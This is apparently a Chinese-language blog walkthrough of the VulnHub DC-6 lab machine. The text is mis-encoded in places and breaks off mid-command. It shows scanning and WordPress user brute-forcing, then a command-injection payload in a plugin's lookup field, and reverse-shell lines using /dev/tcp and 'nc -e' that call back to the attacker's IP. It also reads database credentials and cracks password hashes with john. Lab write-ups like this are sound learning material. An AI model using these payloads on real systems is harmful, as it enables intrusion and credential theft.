    <content type="html"><![CDATA[<h1 id="0x09-DC-6-vulnhub"><a href="#0x09-DC-6-vulnhub" class="headerlink" title="0x09 DC: 6~vulnhub"></a>0x09 DC: 6~vulnhub</h1><blockquote><p>é¶æœºåœ°å€ï¼š<a href="https://www.vulnhub.com/entry/dc-6,315/">DC: 6 ~ VulnHub</a></p><p>ç¯å¢ƒä¿¡æ¯ï¼š</p><ul><li>æ”»å‡»æœº IPï¼š192.168.135.141</li><li>é¶æœº IPï¼š192.168.135.161</li></ul></blockquote><h2 id="ä¸€ã€ä¿¡æ¯æ”¶é›†"><a href="#ä¸€ã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸€ã€ä¿¡æ¯æ”¶é›†"></a>ä¸€ã€ä¿¡æ¯æ”¶é›†</h2><h3 id="1ã€ä¸»æœºæ¢æµ‹"><a href="#1ã€ä¸»æœºæ¢æµ‹" class="headerlink" title="1ã€ä¸»æœºæ¢æµ‹"></a>1ã€ä¸»æœºæ¢æµ‹</h3><p><strong>nmap å‘½ä»¤ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sn 192.168.135.0/24</span><br></code></pre></td></tr></table></figure><p><strong>å¾—åˆ°é¶æœº ipï¼š192.168.135.161</strong></p><h3 id="2ã€ç«¯å£æ‰«æ"><a href="#2ã€ç«¯å£æ‰«æ" class="headerlink" title="2ã€ç«¯å£æ‰«æ"></a>2ã€ç«¯å£æ‰«æ</h3><p><strong>nmap å‘½ä»¤ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo nmap -sS -A -p- 192.168.135.161</span><br>[sudo] password for kali: <br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-07-11 10:35 EDT<br>Nmap scan report for 192.168.135.161<br>Host is up (0.00063s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA)<br>|   256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA)<br>|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519)<br>80/tcp open  http    Apache httpd 2.4.25 ((Debian))<br>|_http-server-header: Apache/2.4.25 (Debian)<br>|_http-title: Did not follow redirect to http://wordy/<br>MAC Address: 00:0C:29:A3:6E:B2 (VMware)<br>Device type: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br></code></pre></td></tr></table></figure><p><strong>å¾—åˆ°ç›®æ ‡ç«¯å£ä¿¡æ¯ï¼š</strong></p><div class="table-container"><table><thead><tr><th>PORT</th><th>STATE</th><th>SERVICE</th><th>VERSION</th></tr></thead><tbody><tr><td>22/tcp</td><td>open</td><td>ssh</td><td>OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</td></tr><tr><td>80/tcp</td><td>open</td><td>http</td><td>Apache httpd 2.4.25 ((Debian))</td></tr></tbody></table></div><h3 id="3ã€ç«¯å£æ¢æµ‹"><a href="#3ã€ç«¯å£æ¢æµ‹" class="headerlink" title="3ã€ç«¯å£æ¢æµ‹"></a>3ã€ç«¯å£æ¢æµ‹</h3><p><strong>22ç«¯å£</strong></p><p>æš‚æ—¶æœªå¾—åˆ° username å’Œ password çš„ç›¸å…³ä¿¡æ¯ï¼Œæ— æ³•ä½¿ç”¨ ssh</p><p><strong>80ç«¯å£</strong></p><blockquote><p>NOTE: You WILL need to edit your hosts file on your pentesting device so that it reads something like:</p><p>192.168.0.142 wordy</p><p>NOTE: Iâ€™ve used 192.168.0.142 as an example. Youâ€™ll need to use your normal method to determine the IP address of the VM, and adapt accordingly.</p><p>This is VERY important.</p></blockquote><p>è®¿é—® <code>http://192.168.135.161</code> ï¼Œå‘ç°æ— æ³•è®¿é—®ä¸”é‡å®šå‘åˆ°äº† <code>http://wordy/</code> ï¼Œè¿™æ ·çš„è¯æˆ‘ä»¬æ·»åŠ ä¸€æ¡æ˜ å°„ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cat /etc/hosts</span>          <br>127.0.0.1       localhost<br>127.0.1.1       kali<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> sudo mousepad /etc/hosts</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> cat /etc/hosts</span>          <br>127.0.0.1       localhost<br>127.0.1.1       kali<br>192.168.135.161 wordy<br><br></code></pre></td></tr></table></figure><p>è¿™æ ·å°±å¯ä»¥æ­£å¸¸è®¿é—®äº†ã€‚</p><p>è¿›è¡Œç›®å½•çˆ†ç ´ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> dirb http://wordy</span>                                                    <br><br>---- Scanning URL: http://wordy/ ----<br>+ http://wordy/index.php (CODE:301|SIZE:0)<br>+ http://wordy/server-status (CODE:403|SIZE:293)<br>==&gt; DIRECTORY: http://wordy/wp-admin/<br>==&gt; DIRECTORY: http://wordy/wp-content/<br>==&gt; DIRECTORY: http://wordy/wp-includes/<br>+ http://wordy/xmlrpc.php (CODE:405|SIZE:42)<br></code></pre></td></tr></table></figure><p>å‘ç°æ˜¯ä¸ª WordPress ç«™ç‚¹ï¼Œä½¿ç”¨ wpscan æšä¸¾ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> wpscan --url http://wordy --enumerate u</span><br><br>[+] URL: http://wordy/ [192.168.135.161]<br><br>[+] WordPress version 5.1.1 identified (Insecure, released on 2019-03-13).<br> | Found By: Rss Generator (Passive Detection)<br> |  - http://wordy/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.1.1&lt;/generator&gt;<br> |  - http://wordy/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.1.1&lt;/generator&gt;<br><br>[+] Enumerating Users (via Passive and Aggressive Methods)<br> Brute Forcing Author IDs - Time: 00:00:00 &lt;=============================================================&gt; (10 / 10) 100.00% Time: 00:00:00<br><br>[i] User(s) Identified:<br><br>[+] admin<br> | Found By: Rss Generator (Passive Detection)<br> | Confirmed By:<br> |  Wp Json Api (Aggressive Detection)<br> |   - http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1<br> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> |  Login Error Messages (Aggressive Detection)<br><br>[+] jens<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)<br><br>[+] graham<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)<br><br>[+] mark<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)<br><br>[+] sarah<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)<br></code></pre></td></tr></table></figure><p>é¢˜ç›®ä½œè€…ç»™çš„æç¤ºï¼š</p><blockquote><p>CLUE</p><p>OK, this isnâ€™t really a clue as such, but more of some â€œwe donâ€™t want to spend five years waiting for a certain process to finishâ€ kind of advice for those who just want to get on with the job.</p><p>cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt </p><p>That should save you a few years. ;-)</p></blockquote><p>åˆ›å»ºå­—å…¸è¿›è¡Œçˆ†ç ´ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;admin\njens\ngraham\nmark\nsarah&quot;</span> &gt; user.txt</span><br><span class="hljs-meta">$</span><span class="bash"> cat user.txt</span>  <br>admin<br>jens<br>graham<br>mark<br>sarah<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> wpscan --url http://wordy -U user.txt -P passwords.txt</span><br><br>[+] Performing password attack on Xmlrpc against 5 user/s<br>[SUCCESS] - mark / helpdesk01                                                                                                              <br>Trying sarah / !lak019b Time: 00:03:23 &lt;=================================================           &gt; (12547 / 15215) 82.46%  ETA: ??:??:??<br><br>[!] Valid Combinations Found:<br> | Username: mark, Password: helpdesk01<br></code></pre></td></tr></table></figure><p>è®¿é—® <code>http://wordy/wp-admin</code> ï¼Œé‡å®šå‘åˆ°åå°ç™»å½•é¡µ <code>http://wordy/wp-login.php</code> ï¼Œè¿›è¡Œç™»å½•</p><h2 id="äºŒã€æƒé™è·å–"><a href="#äºŒã€æƒé™è·å–" class="headerlink" title="äºŒã€æƒé™è·å–"></a>äºŒã€æƒé™è·å–</h2><p>åœ¨ <code>activity_monitor</code> ===&gt; <code>tools</code> ä¸‹ï¼Œå‘ç°æœ‰ä¸ªè§£æ IP åœ°å€ä¸ºä¸»æœºåçš„æŸ¥æ‰¾åŠŸèƒ½ï¼Œè¿™ä¸ªåŠŸèƒ½å¯ä»¥å®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œ</p><p>burp æŠ“åŒ…ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>wordy<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=---------------------------231067001935986298275393280<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>30<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://wordy<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>wordpress_14014489b649086e51cacb340bafe656=mark%7C1657762666%7CV5tY1Gig7Y3BLyLMi2N8APVpcQNksGkYUCeB7mpv33l%7C4eae77eb132fc3228c3b189f7fac3315ddfb2ed11d1c46392067d0553d01d545; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_14014489b649086e51cacb340bafe656=mark%7C1657762666%7CV5tY1Gig7Y3BLyLMi2N8APVpcQNksGkYUCeB7mpv33l%7C74082dfc18805151b1531c3cd705624ccf2179b8b53e32317faf53e3276321cc; wp-settings-time-3=1657589884; wp-settings-3=mfold%3Do<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><span class="applescript"><span class="hljs-comment">-----------------------------231067001935986298275393280</span></span><br><span class="applescript">Content-Disposition: form-data; <span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;ip&quot;</span></span><br><span class="applescript"></span><br><span class="applescript"><span class="hljs-number">192.168</span><span class="hljs-number">.135</span><span class="hljs-number">.141</span></span><br><span class="applescript"><span class="hljs-comment">-----------------------------231067001935986298275393280</span></span><br><span class="applescript">Content-Disposition: form-data; <span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;lookup&quot;</span></span><br><span class="applescript"></span><br><span class="applescript">Lookup</span><br><span class="applescript"><span class="hljs-comment">-----------------------------231067001935986298275393280--</span></span><br></code></pre></td></tr></table></figure><p>æ”¹åŒ…ï¼š</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">192.168.135.141</span>;whoami<br></code></pre></td></tr></table></figure><p>æ”¾åŒ…ï¼ŒæˆåŠŸå®ç°å‘½ä»¤æ‰§è¡Œï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2022</span>-<span class="hljs-number">07</span>-<span class="hljs-number">12</span> <span class="hljs-number">01</span>:<span class="hljs-number">58</span>:<span class="hljs-number">02</span><br><br><span class="hljs-attribute">The</span> IP address <span class="hljs-number">192.168.135.141</span>;whoami resolves to .<br><br><span class="hljs-attribute">Output</span> from dig:<br><br><span class="hljs-attribute">www</span>-data<br></code></pre></td></tr></table></figure><p>åå¼¹ shellï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> bash, fail</span><br>192.168.135.141;bash -i &gt;&amp; /dev/tcp/192.168.135.141/4444 0&gt;&amp;1<br><span class="hljs-meta">#</span><span class="bash"> nc, success</span><br>192.168.135.141;nc -e /bin/bash 192.168.135.141 4444<br></code></pre></td></tr></table></figure><p>kali ç›‘å¬ï¼ŒæˆåŠŸå¾—åˆ° shellï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 4444</span>                                         <br>listening on [any] 4444 ...<br>connect to [192.168.135.141] from (UNKNOWN) [192.168.135.161] 48976<br>whoami<br>www-data<br>python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;<br>www-data@dc-6:/var/www/html/wp-admin$<br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ç›´æ¥æŸ¥æ‰¾åˆ©ç”¨è„šæœ¬ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> searchsploit wordpress activity monitor</span>                 <br>----------------------------------------------------------------------------------------------------------<br>Exploit Title                                                                                            |  Path<br>----------------------------------------------------------------------------------------------------------<br>WordPress Plugin Plainview Activity Monitor 20161228 - (Authenticated) Command Injection                 | php/webapps/45274.html<br>WordPress Plugin Plainview Activity Monitor 20161228 - Remote Code Execution (RCE) (Authenticated) (2)   | php/webapps/50110.py<br>----------------------------------------------------------------------------------------------------------<br>Shellcodes: No Results<br></code></pre></td></tr></table></figure><h2 id="ä¸‰ã€æƒé™æå‡"><a href="#ä¸‰ã€æƒé™æå‡" class="headerlink" title="ä¸‰ã€æƒé™æå‡"></a>ä¸‰ã€æƒé™æå‡</h2><p>æŸ¥æ‰¾ SUIDï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@dc-6:/var/www/html/wp-admin$ find / -perm -u=s -type f 2&gt;/dev/null<br>find / -perm -u=s -type f 2&gt;/dev/null<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/openssh/ssh-keysign<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/bin/chfn<br>/usr/bin/sudo<br>/usr/bin/gpasswd<br>/usr/bin/newgrp<br>/usr/bin/chsh<br>/usr/bin/passwd<br>/bin/su<br>/bin/mount<br>/bin/umount<br>/bin/ping<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹é…ç½®æ–‡ä»¶ï¼Œå¾—åˆ°æ•°æ®åº“è´¦å·å¯†ç ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@dc-6:/var/www/html/wp-admin$ cd ..<br>cd ..<br>www-data@dc-6:/var/www/html$ ls<br>ls<br>index.php        wp-blog-header.php    wp-cron.php        wp-mail.php<br>license.txt      wp-comments-post.php  wp-includes        wp-settings.php<br>readme.html      wp-config-sample.php  wp-links-opml.php  wp-signup.php<br>wp-activate.php  wp-config.php         wp-load.php        wp-trackback.php<br>wp-admin         wp-content            wp-login.php       xmlrpc.php<br>www-data@dc-6:/var/www/html$ cat wp-config.php<br>cat wp-config.php<br><br>// ** MySQL settings - You can get this info from your web host ** //<br>/** The name of the database for WordPress */<br><br>define(&#x27;WP_HOME&#x27;,&#x27;http://wordy&#x27;);<br>define(&#x27;WP_SITEURL&#x27;,&#x27;http://wordy&#x27;);<br><br>define( &#x27;DB_NAME&#x27;, &#x27;wordpressdb&#x27; );<br><br>/** MySQL database username */<br>define( &#x27;DB_USER&#x27;, &#x27;wpdbuser&#x27; );<br><br>/** MySQL database password */<br>define( &#x27;DB_PASSWORD&#x27;, &#x27;meErKatZ&#x27; );<br><br>/** MySQL hostname */<br>define( &#x27;DB_HOST&#x27;, &#x27;localhost&#x27; );<br><br>/** Database Charset to use in creating database tables. */<br>define( &#x27;DB_CHARSET&#x27;, &#x27;utf8&#x27; );<br><br>/** The Database Collate type. Don&#x27;t change this if in doubt. */<br>define( &#x27;DB_COLLATE&#x27;, &#x27;&#x27; );<br></code></pre></td></tr></table></figure><p>ç™»å½•æ•°æ®åº“ï¼Œå¾—åˆ°ç”¨æˆ·å¯†ç ç›å€¼ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@dc-6:/var/www/html$ mysql -uwpdbuser -pmeErKatZ<br>mysql -uwpdbuser -pmeErKatZ<br>Welcome to the MariaDB monitor.  Commands end with ; or \g.<br>Your MariaDB connection id is 92559<br>Server version: 10.1.37-MariaDB-0+deb9u1 Debian 9.6<br><br>Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.<br><br>Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.<br><br>MariaDB [(none)]&gt; show databases;<br>show databases;<br>+--------------------+<br>| Database           |<br>+--------------------+<br>| information_schema |<br>| wordpressdb        |<br>+--------------------+<br>2 rows in set (0.05 sec)<br><br>MariaDB [(none)]&gt; use wordpressdb;<br>use wordpressdb;<br>Reading table information for completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br>MariaDB [wordpressdb]&gt; show tables;<br>show tables;<br>+-----------------------+<br>| Tables_in_wordpressdb |<br>+-----------------------+<br>| wp_commentmeta        |<br>| wp_comments           |<br>| wp_links              |<br>| wp_options            |<br>| wp_postmeta           |<br>| wp_posts              |<br>| wp_pv_am_activities   |<br>| wp_term_relationships |<br>| wp_term_taxonomy      |<br>| wp_termmeta           |<br>| wp_terms              |<br>| wp_usermeta           |<br>| wp_users              |<br>+-----------------------+<br>13 rows in set (0.00 sec)<br><br>MariaDB [wordpressdb]&gt; select ID,user_login,user_pass,user_nicename from wp_users;<br>&lt;ct ID,user_login,user_pass,user_nicename,user_activation_key from wp_users; <br>+----+------------+------------------------------------+---------------+<br>| ID | user_login | user_pass                          | user_nicename |<br>+----+------------+------------------------------------+---------------+<br>|  1 | admin      | $P$BDhiv9Y.kOYzAN8XmDbzG00hpbb2LA1 | admin         |<br>|  2 | graham     | $P$B/mSJ8xC4iPJAbCzbRXKilHMbSoFE41 | graham        |<br>|  3 | mark       | $P$BdDI8ehZKO5B/cJS8H0j1hU1J9t810/ | mark          |<br>|  4 | sarah      | $P$BEDLXtO6PUnSiB6lVaYkqUIMO/qx.3/ | sarah         |<br>|  5 | jens       | $P$B//75HFVPBwqsUTvkBcHA8i4DUJ7Ru0 | jens          |<br>+----+------------+------------------------------------+---------------+<br>5 rows in set (0.00 sec)<br><br>MariaDB [wordpressdb]&gt; <br></code></pre></td></tr></table></figure><p>john ç ´è§£ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cat passwd.txt</span>                                                   <br>admin:$P$BDhiv9Y.kOYzAN8XmDbzG00hpbb2LA1<br>graham:$P$B/mSJ8xC4iPJAbCzbRXKilHMbSoFE41<br>mark:$P$BdDI8ehZKO5B/cJS8H0j1hU1J9t810/<br>sarah:$P$BEDLXtO6PUnSiB6lVaYkqUIMO/qx.3/<br>jens:$P$B//75HFVPBwqsUTvkBcHA8i4DUJ7Ru0<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> john --wordlist=/usr/share/wordlists/rockyou.txt passwd.txt</span><br>Using default input encoding: UTF-8<br>Loaded 5 password hashes with 5 different salts (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])<br>Cost 1 (iteration count) is 8192 for all loaded hashes<br>Will run 4 OpenMP threads<br>Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status<br>helpdesk01       (mark)<br>1g 0:01:36:26 DONE (2022-07-11 23:59) 0.000172g/s 2478p/s 11232c/s 11232C/s  joefeher..*7Â¡Vamos!<br>Use the &quot;--show --format=phpass&quot; options to display all of the cracked passwords reliably<br>Session completed<br></code></pre></td></tr></table></figure><p>æœªçˆ†ç ´å‡ºå…¶ä»–ç”¨æˆ·ï¼Œä¸” mark ç”¨æˆ·çš„å¯†ç ä¹Ÿä¸èƒ½ SSH ç™»å½•</p><p>åœ¨ç”¨æˆ·ç›®å½•ä¸‹æŸ¥æ‰¾ä¿¡æ¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@dc-6:/var/www/html$ ls /home<br>ls /home<br>graham  jens  mark  sarah<br>www-data@dc-6:/var/www/html$ cd /home<br>cd /home<br>www-data@dc-6:/home$ ls<br>ls<br>graham  jens  mark  sarah<br>www-data@dc-6:/home$ ls graham<br>ls graham<br>www-data@dc-6:/home$ ls jens<br>ls 